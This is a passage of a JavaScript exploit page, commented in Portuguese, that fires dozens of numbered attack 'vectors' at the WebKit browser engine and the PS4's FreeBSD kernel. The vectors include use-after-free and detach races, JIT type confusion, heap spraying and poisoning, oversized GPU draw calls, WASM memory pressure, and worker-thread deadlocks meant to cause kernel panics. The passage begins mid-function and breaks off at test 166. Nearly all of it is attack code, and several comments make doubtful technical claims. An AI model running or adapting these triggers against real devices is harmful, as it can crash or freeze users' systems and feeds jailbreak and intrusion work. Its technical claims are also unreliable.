                    // Acesso força leitura de memória
                    postMessage(s.indexOf("B"));
                }
            `], {type: 'text/javascript'});
            
            const w = new Worker(URL.createObjectURL(blob));
            
            // Envia a string gigante. O WebKit tenta clonar/ler.
            w.postMessage(s);
            
            // Ao mesmo tempo, força flatten localmente
            let c = s.charAt(100);
            
            log("Concurrency trigger sent.");
        }

        // ==========================================
        //        KERNEL VECTORS (System)
        // ==========================================

        // TESTE 4: UMTX Thread Deadlock (Kernel Panic)
        // Baseado em: "thr_umtx.c", "rdlock error", "wrlock error" em 1200_libkernel_sys.json.
        // Usa Atomics para corromper o estado de bloqueio (mutex) do kernel FreeBSD.
        function runKernel1() {
            log("Injecting: UMTX Kernel Deadlock...");
            
            if(!window.SharedArrayBuffer) return log("SharedArrayBuffer not supported.");
            
            const sab = new SharedArrayBuffer(4096);
            const int32 = new Int32Array(sab);
            
            // Cria 8 workers para "martelar" o sistema de locks
            const code = `
                onmessage = e => {
                    const i32 = new Int32Array(e.data);
                    while(true) {
                        // Atomics.wait chama syscall _umtx_op internamente
                        // Usar timeout 0 força alta carga de syscalls
                        Atomics.wait(i32, 0, 0, 0);
                        Atomics.notify(i32, 0, 1);
                    }
                }
            `;
            const blob = new Blob([code], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            for(let i=0; i<8; i++) {
                new Worker(url).postMessage(sab);
            }
            
            log("8 Threads spamming syscall _umtx_op.");
        }

        // TESTE 5: Socket mbuf Double-Free
        // Baseado em: Erros de socket e "/dev/console" nos logs.
        // Tenta libertar a memória de um pacote de rede duas vezes.
        function runKernel2() {
            log("Injecting: Socket mbuf Double-Free...");
            
            // Dados para encher o buffer de envio (mbuf cluster)
            const payload = new Uint8Array(65536); 
            
            try {
                // Abre socket (Websocket usa socket TCP real no kernel)
                const ws = new WebSocket("ws://127.0.0.1:1337");
                
                ws.onopen = () => {
                    // Envia dados massivos
                    ws.send(payload);
                    ws.send(payload);
                    
                    // Fecha imediatamente enquanto o kernel ainda está processando o envio
                    ws.close();
                    
                    // Tenta enviar no socket fechado (race condition para UAF)
                    try { ws.send(payload); } catch(e) {}
                };
                
                // Força erro se não abrir
                setTimeout(() => ws.close(), 10);
                
                log("Socket race initiated.");
            } catch(e) { log("Socket Error: " + e); }
        }

        // TESTE 6: GPU Command Buffer OOB (Graphics Panic)
        // Baseado em: Referências a GnmDriver e WebGL2.
        // Usa TransformFeedback para escrever fora da memória alocada pela GPU.
        function runKernel3() {
            log("Injecting: GPU Command Buffer OOB...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("WebGL2 required for this exploit.");
            
            // Shader que apenas passa dados
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            
            const p = gl.createProgram();
            gl.attachShader(p, vs);
            
            // Configura o TransformFeedback para escrever 'gl_Position'
            gl.transformFeedbackVaryings(p, ["gl_Position"], gl.SEPARATE_ATTRIBS);
            gl.linkProgram(p);
            gl.useProgram(p);
            
            // Aloca um buffer PEQUENO (4 bytes)
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, buf);
            gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 4, gl.STATIC_DRAW);
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, buf);
            
            // Inicia o modo de escrita da GPU
            gl.beginTransformFeedback(gl.POINTS);
            
            // Desenha MUITOS pontos. Cada ponto escreve 16 bytes (vec4).
            // Buffer tem 4 bytes. Tentamos escrever 16.000 bytes.
            // Se o driver não fizer bounds checking -> Kernel Panic.
            gl.drawArrays(gl.POINTS, 0, 1000);
            
            gl.endTransformFeedback();
            
            log("Malicious Draw Call sent to GPU.");
        }
     // ==========================================
        //        WEBKIT VECTORS (136-138)
        // ==========================================

        // 136. FontFaceSet Iterator Use-After-Free
        // Tenta modificar o conjunto de fontes (FontFaceSet) enquanto itera sobre ele.
        // Se o WebKit não proteger o iterador, ele acessará uma fonte deletada.
        function runTest136() {
            log("Injecting: FontFaceSet UAF...");
            const font = new FontFace("CrashFont", "url(data:font/woff;base64,AAEAAA...)");
            document.fonts.add(font);
            
            // Loop de iteração e modificação simultânea
            try {
                document.fonts.forEach((f, f2, set) => {
                    // Remove a própria fonte durante o callback
                    set.delete(f);
                    // Tenta acessar propriedades da fonte deletada (potencial UAF)
                    let status = f.status; 
                    // Força Garbage Collection (simulado via alocação)
                    let junk = new ArrayBuffer(1024 * 1024);
                });
                log("Iterator race executed.");
            } catch(e) { log("Safe: " + e); }
        }

        // 137. OffscreenCanvas Transfer Race
        // Transfere o controle de um Canvas para um Worker, mas tenta desenhar nele na thread principal
        // no exato momento da transferência. Visa corromper o ponteiro do bitmap.
        function runTest137() {
            log("Injecting: OffscreenCanvas Race...");
            if (!window.OffscreenCanvas) return log("OffscreenCanvas not supported.");

            const canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            const offscreen = canvas.transferControlToOffscreen();
            
            const worker = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let c=e.data; c.getContext("2d");}'], {type: 'text/javascript'})));
            
            // Race: PostMessage (transfer) vs Context Creation
            try {
                // Envia para o worker (transfere ownership)
                worker.postMessage(offscreen, [offscreen]);
                
                // Tenta acessar imediatamente na main thread (ilegal, mas testando race)
                // Se o navegador for lento em marcar como "neutered", crasha.
                let ctx = canvas.getContext('2d'); 
                ctx.fillStyle = 'red';
                ctx.fillRect(0,0,10,10);
            } catch(e) { log("Transfer lock active: " + e); }
        }

        // 138. Large String Normalize Overflow
        // Usa `String.prototype.normalize()` (biblioteca ICU interna) com strings gigantes.
        // A normalização Unicode expande caracteres, podendo estourar o buffer de destino calculado incorretamente.
        function runTest138() {
            log("Injecting: ICU Normalize Overflow...");
            // Caracter que expande em tamanho quando normalizado (NFKC)
            // Ex: U+FDFA (Arabian Ligature) expande para ~18 chars
            let s = "\uFDFA".repeat(50000); 
            
            try {
                // Força expansão massiva na memória
                let norm = s.normalize("NFKC");
                log("Normalization done. Length: " + norm.length);
            } catch(e) { log("OOM caught: " + e); }
        }

        // ==========================================
        //        KERNEL VECTORS (139-141)
        // ==========================================

        // 139. GPU Index Buffer Wrap (GnmDriver)
        // Usa `drawElements` com um tipo de índice pequeno (UNSIGNED_BYTE) mas offsets que causam wrap-around.
        // Tenta fazer a GPU ler índices de uma área de memória não autorizada.
        function runTest139() {
            log("Injecting: GPU Index Buffer Wrap...");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const b = gl.createBuffer();
            gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, b);
            // Buffer pequeno (256 bytes)
            gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint8Array(256), gl.STATIC_DRAW);
            
            // Tenta desenhar usando um offset que, somado ao count, excede o buffer
            // Se o driver somar offset (int32) e ocorrer overflow, ele lê do início (heap da GPU).
            try {
                // Offset int32 max
                gl.drawElements(gl.POINTS, 100, gl.UNSIGNED_BYTE, 2147483647); 
                log("Malicious draw call sent.");
            } catch(e) { log("GL Error: " + e); }
        }

        // 140. Nested Blob VFS Recursion
        // Cria Blobs aninhados recursivamente para estourar a stack do Kernel Filesystem (VFS).
        // Log "vm.budgets" sugere limites de memória rígidos.
        function runTest140() {
            log("Injecting: VFS Stack Recursion...");
            let b = new Blob(["init"]);
            
            try {
                // Empilha blobs dentro de blobs
                for(let i=0; i<5000; i++) {
                    b = new Blob([b, b]); // Crescimento exponencial de referências
                }
                
                // Força leitura para disparar o VFS walker do kernel
                let fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(0, 10)); 
                log("Recursive Blob read triggered.");
            } catch(e) { log("Blob limit: " + e); }
        }

        // 141. SharedMem Atomic Deadlock (Scheduler)
        // Cria um cenário onde duas threads esperam uma pela outra (Deadlock) usando Atomics.
        // Isso estressa o scheduler do Kernel (`kern.sched`) e pode congelar o sistema.
        function runTest141() {
            log("Injecting: Kernel Scheduler Deadlock...");
            if(!window.SharedArrayBuffer) return log("No SAB support.");

            const sab = new SharedArrayBuffer(8);
            const i32 = new Int32Array(sab); // Index 0: Lock A, Index 1: Lock B

            // Worker 1: Pega A, Espera B
            const w1 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    // Simula lock simples via loop
                    while(Atomics.compareExchange(i, 0, 0, 1) !== 0); // Lock A
                    // Espera B ser 1
                    while(Atomics.load(i, 1) === 0);
                }
            `], {type: 'text/javascript'})));

            // Worker 2: Pega B, Espera A
            const w2 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    while(Atomics.compareExchange(i, 1, 0, 1) !== 0); // Lock B
                    // Espera A ser 1
                    while(Atomics.load(i, 0) === 0);
                }
            `], {type: 'text/javascript'})));

            w1.postMessage(sab);
            w2.postMessage(sab);
            log("Cross-thread deadlock initiated.");
        }
     // 142. bmalloc IsoHeap Poisoning
        // Baseado em: Strings "bmalloc_IsoHeap" e "SceNKBMalloc" nos logs.
        // O bmalloc isola heaps por tamanho/tipo. Tentamos "envenenar" um heap livre.
        // Cria objetos, liberta-os (free), e tenta sobrescrever o ponteiro 'next' da freelist.
        function runTest142() {
            log("Iniciando bmalloc IsoHeap Poisoning...", "log-wk");
            
            // Tamanho específico que cai num bucket do bmalloc
            const SIZE = 128; 
            let spray = [];
            
            try {
                // 1. Encher o Heap
                for(let i=0; i<10000; i++) spray.push(new Float64Array(SIZE));
                
                // 2. Criar buracos (Free)
                // Transferir buffers para um Worker "morto" força a liberação imediata
                const w = new Worker(URL.createObjectURL(new Blob([''], {type:'text/javascript'})));
                for(let i=0; i<spray.length; i+=2) {
                    if(spray[i]) w.postMessage(spray[i].buffer, [spray[i].buffer]);
                }
                
                // 3. Poisoning (Realocação Rápida)
                // Tenta ocupar os buracos com dados controlados (ex: ponteiros falsos)
                let poison = new Uint32Array(SIZE * 2); 
                poison.fill(0x41414141); // 'AAAA'
                
                log("Heap bmalloc fragmentado e envenenado. Verifique crash.", "log-wk");
            } catch(e) { log("Erro: " + e, "log-wk"); }
        }

        // 143. JIT Array Type Confusion
        // Baseado em: Otimizações JIT (DFG/FTL) presentes no WebKit moderno.
        // Tenta confundir o compilador sobre o tipo de um array (Int32 vs Double)
        // para ler memória fora dos limites ou pointer leaks.
        function runTest143() {
            log("Disparando JIT Type Confusion...", "log-wk");
            
            // Array que começa como Int32
            let arr = new Array(100).fill(1);
            arr.type = "int";

            // Função "quente" para o JIT otimizar
            function opt(a) {
                // O JIT assume que 'a' é sempre Int32 array baseado no treino
                return a[0]; 
            }

            // Treino
            for(let i=0; i<10000; i++) opt(arr);

            // Mudança de Tipo (Transition)
            // Transforma o array em Array de Doubles (estrutura de memória muda)
            arr[0] = 1.1; 
            
            try {
                // Executa código otimizado com tipo errado
                // Se o JIT não "desotimizar" (bailout), ele lê o double como int ou ponteiro cru
                let val = opt(arr);
                log("JIT executado. Valor retornado: " + val, "log-wk");
            } catch(e) { log("JIT Bailout capturado (Safe).", "log-wk"); }
        }

        // 144. CSS FontFace Set Use-After-Free
        // Baseado em: Bugs históricos de FontFaceSet no WebKit.
        // Itera sobre fontes enquanto as deleta, tentando causar UAF no iterador interno C++.
        function runTest144() {
            log("Executando FontFaceSet UAF...", "log-wk");
            
            const f = new FontFace("Crash", "url(data:x)");
            document.fonts.add(f);
            
            try {
                // Itera e modifica ao mesmo tempo
                document.fonts.forEach((face, face2, set) => {
                    set.delete(face); // Remove o item atual
                    // Tenta forçar acesso interno à estrutura deletada via API
                    face.load().catch(()=>{}); 
                    
                    // Alocação para sobrescrever memória libertada
                    let junk = new ArrayBuffer(1024);
                });
                log("Iterador FontFace manipulado.", "log-wk");
            } catch(e) { log("Erro seguro: " + e, "log-wk"); }
        }

        // ==========================================
        //        KERNEL VECTORS (145-147)
        // ==========================================

        // 145. UMTX Kernel Deadlock (Thread Management)
        // Baseado em: Logs "thr_umtx.c" e "rdlock error".
        // Usa `Atomics.wait` (syscall _umtx_op) com valores inválidos ou contendores
        // para tentar travar o scheduler do Kernel FreeBSD.
        function runTest145() {
            log("Iniciando UMTX Deadlock (Kernel Hang)...", "log-kr");
            if(!window.SharedArrayBuffer) return log("SAB não suportado.", "log-kr");
            
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            // Worker que apenas segura o lock
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    // Entra em wait infinito no kernel
                    Atomics.wait(i, 0, 0); 
                }
            `], {type:'text/javascript'})));
            
            // Lança múltiplos workers para encher a fila de espera do kernel
            for(let i=0; i<16; i++) w.postMessage(sab);
            
            log("16 Threads enviadas para Kernel Wait Queue.", "log-kr");
        }

        // 146. GPU Indirect Draw OOB (GnmDriver)
        // Baseado em: Logs do GnmDriver.
        // Usa `drawArrays` com offsets calculados para causar Integer Overflow
        // no cálculo de endereço de memória da GPU.
        function runTest146() {
            log("Enviando GPU Indirect OOB Draw...", "log-kr");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2'); // Precisa WebGL2 para maior controle
            if(!gl) return log("WebGL2 N/A", "log-kr");

            const b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, 1024, gl.STATIC_DRAW); // Buffer pequeno
            
            // Shader Dummy
            const p = gl.createProgram();
            const v = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(v, "#version 300 es\nvoid main(){gl_Position=vec4(0);}");
            gl.compileShader(v);
            gl.attachShader(p, v);
            gl.linkProgram(p);
            gl.useProgram(p);

            try {
                // count = Pequeno
                // first = Gigante (Max Int32)
                // O driver calcula: base_address + (first * stride)
                // Se first for muito grande, o endereço aponta para memória do Kernel
                gl.drawArrays(gl.POINTS, 2147483600, 10); 
                log("Comando Draw com Offset Overflow enviado.", "log-kr");
            } catch(e) { log("GL Error: " + e, "log-kr"); }
        }

        // 147. VM Map Fragmentation (mlock abuse)
        // Baseado em: "vm.budgets.mlock_avail" em Kernel 1200.json.
        // Tenta fragmentar o mapa de memória do kernel alocando e travando (mlock)
        // pequenas páginas de memória executável via WASM repetidamente.
        function runTest147() {
            log("Fragmentando VM Map (mlock exhaustion)...", "log-kr");
            
            let modules = [];
            // Código WASM mínimo
            const code = new Uint8Array([0,97,115,109,1,0,0,0]); 
            
            const i = setInterval(() => {
                // Compilar WASM força a criação de páginas RWX ou RX travadas na RAM
                WebAssembly.compile(code).then(m => {
                    modules.push(m); // Mantém referência para não libertar
                }).catch(()=>{});
                
                if(modules.length > 5000) {
                    clearInterval(i);
                    log("VM Budget Pressure aplicado (5000+ modules).", "log-kr");
                }
            }, 1);
        }
     // ==========================================
        //        WEBKIT VECTORS (148-150)
        // ==========================================

        // 148. Array Concat Spreadable Race
        // Ataca a implementação de 'concat' no JSC.
        // Define um getter em Symbol.isConcatSpreadable que modifica o array durante a concatenação.
        // Isso pode fazer o WebKit copiar memória de um array que já foi redimensionado ou movido.
        function runTest148() {
            log("Injecting: Array Concat Spreadable Race...");
            
            let arr = [1.1]; // Array de Doubles
            let victim = [2.2, 3.3];
            
            // Define o comportamento malicioso
            Object.defineProperty(victim, Symbol.isConcatSpreadable, {
                get: function() {
                    // MUTAÇÃO: Esvazia o array vitima no meio da operação
                    victim.length = 0; 
                    log("Mutation triggered inside concat.");
                    return true;
                }
            });

            try {
                // concat dispara o getter. Se o JSC não verificar o tamanho novamente, lê lixo (OOB Read).
                let res = arr.concat(victim);
                log("Result length: " + res.length);
            } catch(e) { log("Error: " + e); }
        }

        // 149. RegExp LastIndex JIT Confusion
        // O JIT tenta otimizar acessos a 'lastIndex' em expressões regulares globais.
        // Passamos um objeto que parece um RegExp mas tem efeitos colaterais.
        function runTest149() {
            log("Injecting: RegExp LastIndex Confusion...");
            
            let re = /a/g;
            let str = "aaaaa";
            
            // Objeto que "envenena" a propriedade lastIndex
            let poison = {
                valueOf: function() {
                    // Efeito colateral: Altera o RegExp original
                    re.lastIndex = 1000; 
                    return 0;
                }
            };

            // Função para treinar o JIT
            function opt(r, s) {
                r.lastIndex = poison; // Atribuição maliciosa
                return r.exec(s);
            }

            for(let i=0; i<10000; i++) opt(/a/g, str); // Treino

            try {
                opt(re, str); // Ataque
                log("JIT RegExp executed.");
            } catch(e) { log("JSC Bailout: " + e); }
        }

        // 150. WASM Table Grow Thread Race
        // WebAssembly Tables podem crescer. Se uma thread cresce a tabela enquanto outra a lê,
        // pode haver uma condição de corrida nos ponteiros internos da tabela.
        function runTest150() {
            log("Injecting: WASM Table Grow Race...");
            
            const table = new WebAssembly.Table({initial: 1, maximum: 100, element: "anyfunc"});
            
            // Worker tenta crescer a tabela agressivamente
            const blob = new Blob([`
                onmessage = e => {
                    let t = e.data;
                    setInterval(() => {
                        try { t.grow(1); } catch(e){}
                    }, 0);
                }
            `], {type: 'text/javascript'});
            
            const w = new Worker(URL.createObjectURL(blob));
            w.postMessage(table);

            // Main thread tenta acessar a tabela agressivamente
            let i = setInterval(() => {
                try {
                    let len = table.length;
                    // Acesso que pode falhar se o ponteiro interno estiver sendo atualizado
                    if(len > 50) { clearInterval(i); w.terminate(); log("Table grew successfully."); }
                } catch(e) {}
            }, 0);
        }

        // ==========================================
        //        KERNEL VECTORS (151-153)
        // ==========================================

        // 151. NetBSD mbuf Cluster Spray (Heap Spray)
        // O PS4 usa mbufs para dados de rede. WebRTC DataChannels permitem enviar pacotes arbitrários.
        // Tentamos encher o heap do kernel com dados controlados (Heap Spray) para preparar um UAF.
        function runTest151() {
            log("Injecting: mbuf Cluster Spray...");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("spray", {negotiated: true, id: 0});
            
            // Buffer de tamanho específico para alinhar com clusters de memória do kernel (ex: 2KB)
            const chunk = new Uint8Array(2048); 
            chunk.fill(0x41); // 'A'

            // Envia massivamente
            setInterval(() => {
                if (dc.readyState === "open" && dc.bufferedAmount < 1000000) {
                    try { dc.send(chunk); } catch(e){}
                }
            }, 5);
            
            // Simula abertura
            Object.defineProperty(dc, 'readyState', {value: 'open'});
            log("mbuf Spray initiated via WebRTC.");
        }

        // 152. GPU Shader Loop Unroll Crash
        // Cria um shader com um loop que o compilador do driver tenta desenrolar (unroll).
        // Se o loop for muito complexo, pode causar estouro de pilha no compilador do driver (Kernel Space) ou hang na GPU.
        function runTest152() {
            log("Injecting: Shader Loop Unroll Bomb...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            
            // Loop dinâmico complexo
            const src = `
                precision mediump float;
                void main() {
                    float x = 0.0;
                    for(int i=0; i<10000; i++) {
                        // Dependência de dados complexa para impedir otimização simples
                        x += sin(float(i) * x);
                    }
                    gl_FragColor = vec4(x, 0, 0, 1);
                }
            `;
            
            gl.shaderSource(fs, src);
            gl.compileShader(fs);
            
            // Verificar status força o driver a compilar
            if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
                log("Compiler rejected (Safe).");
            } else {
                log("Shader compiled (GPU stress active).");
            }
        }

        // 153. kqueue/Kevent Race Simulation (Event Queue)
        // O PS4 usa kqueue para eventos. APIs como MessageChannel e Promises usam a fila de eventos.
        // Tentamos criar uma tempestade de eventos (Event Storm) para causar race condition na limpeza da fila.
        function runTest153() {
            log("Injecting: Event Queue Race...");
            
            const mc = new MessageChannel();
            let count = 0;
            
            mc.port1.onmessage = () => {
                count++;
                if (count % 100 === 0) {
                    // A cada 100 mensagens, cria uma microtask storm
                    Promise.resolve().then(() => {
                        for(let i=0; i<500; i++) mc.port2.postMessage(i);
                    });
                }
            };
            
            // Inicia a tempestade
            mc.port2.postMessage("start");
            
            // Tenta fechar o canal no meio da tempestade
            setTimeout(() => {
                mc.port1.close();
                log("Channel closed during event storm.");
            }, 1000);
        }
      // 154. TextEncoder Detach Race (Fast Path OOB)
        // Usa encodeInto em um buffer que é "desligado" (detached) durante a escrita.
        // O WebKit tenta otimizar a escrita de strings. Se o buffer sumir, ele escreve no vácuo (UAF).
        function runTest154() {
            log("154. TextEncoder Detach Race...");
            const encoder = new TextEncoder();
            const buffer = new Uint8Array(1024 * 1024);
            const str = "A".repeat(100000);
            
            // Define um getter malicioso que detacha o buffer quando 'length' é lido
            Object.defineProperty(buffer, 'length', {
                get: function() {
                    try { structuredClone(buffer.buffer, {transfer: [buffer.buffer]}); } catch(e){}
                    return 1024 * 1024;
                }
            });

            try {
                // A função encodeInto pode ler 'length' antes ou durante a operação
                encoder.encodeInto(str, buffer);
                log("Encoder executed with detached buffer.");
            } catch(e) { log("Safe: " + e); }
        }

        // 155. Symbol.species Allocator Trap
        // Sobrescreve o Symbol.species de um TypedArray para retornar um construtor falso.
        // Isso confunde o alocador interno do JSC sobre quanto de memória foi realmente alocada vs solicitada.
        function runTest155() {
            log("155. Symbol.species Allocator Trap...");
            class FakeArray extends Uint8Array {
                static get [Symbol.species]() { 
                    // Retorna um construtor que aloca menos memória que o requisitado
                    return function() { return new Uint8Array(1); }
                }
            }
            
            let arr = new FakeArray(1024);
            // Métodos como map/filter usam Symbol.species para criar o novo array
            // O JSC espera um array de tamanho igual ao original (1024), mas recebe 1.
            try {
                let res = arr.map(x => x);
                // Tentativa de escrita OOB no resultado
                log("Map result length: " + res.length);
            } catch(e) { log("Safe: " + e); }
        }

        // 156. History State Cyclic Crash (Serializer Stack Overflow)
        // Cria um objeto com referências cíclicas e tenta salvá-lo no histórico de navegação.
        // O serializador do WebKit (StructuredClone) pode entrar em recursão infinita e estourar a stack.
        function runTest156() {
            log("156. History State Cycle...");
            let a = {};
            let b = { parent: a };
            a.child = b; // Ciclo: a -> b -> a
            
            // Cria uma cadeia profunda para piorar
            let current = a;
            for(let i=0; i<5000; i++) {
                current.next = { parent: current };
                current = current.next;
            }

            try {
                history.pushState(a, "", "");
                log("History state pushed.");
            } catch(e) { log("Serializer error (Safe): " + e); }
        }

        // ================= KERNEL TESTS (157-159) =================

        // 157. GPU Viewport Tiling Overflow (Rasterizer Panic)
        // O PS4 usa renderização baseada em tiles (blocos).
        // Definir um Viewport gigantesco ou negativo confunde o cálculo de quais tiles ativar.
        // Isso pode fazer a GPU escrever fora da VRAM alocada para o frame.
        function runTest157() {
            log("157. GPU Viewport Overflow...");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            // Valores extremos para Viewport
            // Max Int32 ou valores negativos grandes
            gl.viewport(0, 0, 2147483647, 2147483647);
            
            // Desenha algo para forçar o rasterizer a usar o viewport corrompido
            gl.clearColor(1, 0, 0, 1);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.drawArrays(gl.POINTS, 0, 1);
            
            log("Viewport overflow command sent.");
        }

        // 158. Socket Option (IP_TOS / IP_TTL) Flood
        // Altera opções de socket IP rapidamente. 
        // Cada 'setsockopt' faz uma syscall e altera estruturas no kernel.
        // Fazer isso em loop estressa o lock do socket no kernel FreeBSD.
        function runTest158() {
            log("158. Socket Option Flood...");
            // WebRTC cria sockets UDP reais no kernel
            const pc = new RTCPeerConnection();
            
            // Gera tráfego de mudança de estado de rede
            let i = setInterval(() => {
                try {
                    // Mudar configurações de ICE reinicia sockets internos
                    pc.setConfiguration({iceServers: [{urls: "stun:" + Math.random()}]});
                } catch(e) {}
            }, 5);
            
            setTimeout(() => clearInterval(i), 3000);
            log("Socket configuration spam initiated.");
        }

        // 159. ACP Audio Context Suspend Race
        // Ataca o Audio Co-Processor (ACP).
        // Suspender e Resumir o contexto de áudio altera o estado de energia e clock do hardware.
        // Fazer isso muito rápido numa race condition pode travar o driver de som.
        function runTest159() {
            log("159. ACP Suspend/Resume Race...");
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            
            // Loop de conflito
            let i = setInterval(() => {
                if(ctx.state === 'running') ctx.suspend();
                else ctx.resume();
            }, 0); // 0ms delay = velocidade máxima
            
            // Tenta fechar o contexto enquanto ele está num estado incerto
            setTimeout(() => {
                clearInterval(i);
                ctx.close().then(() => log("ACP Context closed after race."));
            }, 2000);
        }
   // 160. bmalloc Gigacage Bypass
        // O WebKit usa uma "Gigacage" para proteger ponteiros de ArrayBuffer.
        // Tenta transferir um buffer para um Worker (o que o "desliga" na main thread)
        // mas mantém uma referência em cache para escrita OOB.
        function runTest160() {
            log("160. bmalloc Gigacage Bypass...");
            const size = 1024 * 1024 * 16; // 16MB
            const buffer = new ArrayBuffer(size);
            const view = new Uint8Array(buffer);
            
            // Worker para receber o buffer
            const w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("done")}'], {type:'text/javascript'})));
            
            // "Aquecer" o acesso ao buffer para o JIT otimizar
            for(let i=0; i<1000; i++) view[i] = i;

            try {
                // Transferência (Detach)
                w.postMessage(buffer, [buffer]);
                
                // Tenta escrever imediatamente após detach.
                // Se o JIT removeu a verificação de "isDetached", escrevemos em memória libertada.
                view[0] = 0xFF;
                log("Write after detach executed.");
            } catch(e) { log("Safe: " + e); }
        }

        // 161. RegExp JIT Side-Effect
        // O compilador JIT de Regex (Yarr) assume que strings são imutáveis durante o match.
        // Usamos um objeto com `toString` malicioso que altera o estado do Regex no meio da execução.
        function runTest161() {
            log("161. RegExp JIT Side-Effect...");
            const re = /a/g;
            let count = 0;
            
            const evil = {
                toString: function() {
                    count++;
                    // Efeito colateral: reinicia o índice do Regex ou força GC
                    re.lastIndex = 0;
                    if(count % 2 == 0) return "a";
                    return "b";
                }
            };
            
            try {
                // Força o JIT a rodar com input instável
                re.test(evil);
                // Executa em loop para forçar otimização
                for(let i=0; i<10000; i++) re.exec(evil);
                log("RegExp JIT stressed.");
            } catch(e) { log("JIT Bailout: " + e); }
        }

        // 162. SharedWorker Port Zombie
        // Baseado em logs de "SharedWorkerThreadProxy".
        // Cria um canal, envia para um SharedWorker, e fecha o worker.
        // Tenta usar a porta que ficou "órfã" para causar UAF no proxy de thread.
        function runTest162() {
            log("162. SharedWorker Port Zombie...");
            if(!window.SharedWorker) return log("N/A");
            
            const sw = new SharedWorker(URL.createObjectURL(new Blob(["onconnect=e=>{let p=e.ports[0]; p.onmessage=()=>{}}"], {type:'text/javascript'})));
            const mc = new MessageChannel();
            
            sw.port.start();
            // Envia porta para o worker
            sw.port.postMessage("init", [mc.port2]);
            
            // Fecha a conexão principal
            sw.port.close();
            
            // Tenta spammar na porta órfã
            let i = setInterval(() => {
                try {
                    mc.port1.postMessage(new ArrayBuffer(1024));
                } catch(e) {
                    clearInterval(i);
                    log("Port died.");
                }
            }, 1);
            
            setTimeout(() => { clearInterval(i); log("Zombie test done."); }, 2000);
        }

        // ================= KERNEL TESTS (163-165) =================

        // 163. UMTX Lock Upgrade Race
        // Baseado nos erros "rdlock/wrlock".
        // Tenta promover um Lock de Leitura para Lock de Escrita em múltiplas threads simultâneas.
        // Isso estressa a lógica de "thread priority inheritance" do kernel FreeBSD.
        function runTest163() {
            log("163. UMTX Lock Upgrade Race...");
            if(!window.SharedArrayBuffer) return log("N/A");
            
            const sab = new SharedArrayBuffer(1024);
            const int32 = new Int32Array(sab);
            
            const workerCode = `
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    while(true) {
                        // Simula "Try Read Lock" -> "Try Write Lock"
                        // Atomics.wait/notify mapeiam para syscalls de UMTX
                        Atomics.wait(i, 0, 0, 1); // Short wait
                        Atomics.compareExchange(i, 0, 0, 1); // Try Acquire
                        Atomics.store(i, 0, 0); // Release
                        Atomics.notify(i, 0, 1);
                    }
                }
            `;
            
            // Lança 8 threads para garantir contenção
            const blob = new Blob([workerCode], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);
            for(let k=0; k<8; k++) new Worker(url).postMessage(sab);
            
            log("8 Threads spamming UMTX syscalls.");
        }

        // 164. VM Map Flip-Flop (RWX)
        // Baseado em "vm.budgets.mlock".
        // Aloca memória executável (JIT), roda código, e liberta.
        // Faz isso muito rápido para fragmentar o mapa de memória virtual do kernel e forçar TLB flushes.
        function runTest164() {
            log("164. VM Map Flip-Flop...");
            const code = new Uint8Array([0,97,115,109,1,0,0,0]); // WASM Header
            
            let i = setInterval(() => {
                // Compilação cria páginas RWX (Read-Write-Execute)
                WebAssembly.compile(code).then(m => {
                    // Instanciação usa as páginas
                    return WebAssembly.instantiate(m);
                }).then(() => {
                    // GC limpa (unmap)
                }).catch(()=>{});
            }, 1); // 1ms loop
            
            setTimeout(() => { clearInterval(i); log("VM stress finished."); }, 3000);
        }

        // 165. Socket OOB Data Panic
        // A stack TCP/IP do FreeBSD tem tratamento complexo para dados "Out-of-Band" (Urgent Pointer).
        // Embora Websockets não suportem OOB nativo, usamos WebRTC DataChannel
        // para enviar pacotes desordenados em alta velocidade, simulando stress no buffer mbuf.
        function runTest165() {
            log("165. Socket OOB Data Panic...");
            const pc = new RTCPeerConnection();
            // ordered: false simula entrega UDP/Desordenada, estressando o remontador
            const dc = pc.createDataChannel("oob", {ordered: false, maxRetransmits: 0});
            
            pc.createOffer().then(o => pc.setLocalDescription(o));
            
            const payload = new Uint8Array(2048); // 2KB Packet
            payload.fill(0xCC); // Int3 breakpoint opcode pattern (just in case)
            
            let i = setInterval(() => {
                try {
                    // Tenta enviar antes da conexão estar pronta (buffer no kernel)
                    dc.send(payload);
                } catch(e) {}
            }, 0);
            
            setTimeout(() => { clearInterval(i); pc.close(); log("OOB Flood done."); }, 2000);
        }
       // ==========================================
        //        WEBKIT VECTORS (166-168)
        // ==========================================

        // 166. ReadableStream BYOB (Bring Your Own Buffer) UAF
